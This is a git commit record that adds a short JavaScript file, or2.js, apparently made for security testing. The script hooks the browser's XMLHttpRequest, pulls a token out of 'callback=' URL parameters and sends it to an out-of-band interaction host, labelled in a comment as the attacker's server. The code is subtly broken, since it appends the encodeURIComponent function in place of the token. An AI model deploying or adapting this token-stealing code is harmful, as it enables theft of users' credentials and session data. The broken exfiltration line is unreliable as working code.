e02a12b9f30d8dde2e1fb4dfd70a1982bca0ffa5
Chiagoziem Mba-Oji <100405629+g0ziem@users.noreply.github.com>
2024-02-07 16:30:32 +0100

    Update and rename or2.html to or2.js

---
+++ or2.js
@@ -0,0 +1,18 @@
+// Intercepting HTTP requests
+(function() {
+    var open = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this.addEventListener('load', function() {
+            // Check if the URL contains the callback parameter
+            if (url.includes('callback=')) {
+                // Extract the token from the callback parameter
+                var token = decodeURIComponent(url.split('callback=')[1]);
+                // Send the token to the attacker's server
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://xjhqloheesngodljevxqvjgd7mjynh9e8.oast.fun/?token='+encodeURIComponent);
+                xhr.send();
+            }
+        });
+        open.apply(this, arguments);
+    };
+})();
